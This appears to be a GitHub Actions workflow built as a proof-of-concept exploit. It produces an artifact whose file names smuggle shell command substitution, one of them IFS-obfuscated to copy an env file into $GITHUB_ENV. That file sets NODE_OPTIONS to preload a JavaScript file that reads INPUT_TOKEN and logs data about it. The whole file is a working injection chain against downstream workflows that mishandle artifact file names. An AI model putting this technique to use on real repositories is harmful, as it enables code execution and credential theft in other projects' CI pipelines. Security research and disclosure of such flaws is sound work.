name: Test

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: read

jobs:
  produce:
    runs-on: ubuntu-latest
    steps:
      - name: Build artifact with attacker-controlled file names and contents
        run: |
          mkdir -p content
          cd content
          printf 'RCE_PROOF: normal artifact content\n' > summary.txt
          printf 'NODE_OPTIONS=--require=/tmp/content/content/p.js\n' > env.txt
          printf 'DECOY\n' > x.txt
          cat > p.js <<'JS'
          const fs = require('fs');
          const t = process.env.INPUT_TOKEN || '';
          const s = 'PRELOAD_RAN token_len=' + t.length + ' action=' + (process.env.GITHUB_ACTION || '?');
          try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY || '/tmp/s', s + '\n'); } catch (e) {}
          console.log(s);
          JS
          touch 'x$(id).txt'
          W='${PWD:0:1}'
          touch "x\$(cp\${IFS}$W""tmp$W""content$W""content$W""env.txt\${IFS}\$GITHUB_ENV).txt"
          ls -la
      - name: Upload artifact
        uses: actions/upload-artifact@v4
        with:
          name: content
          path: content
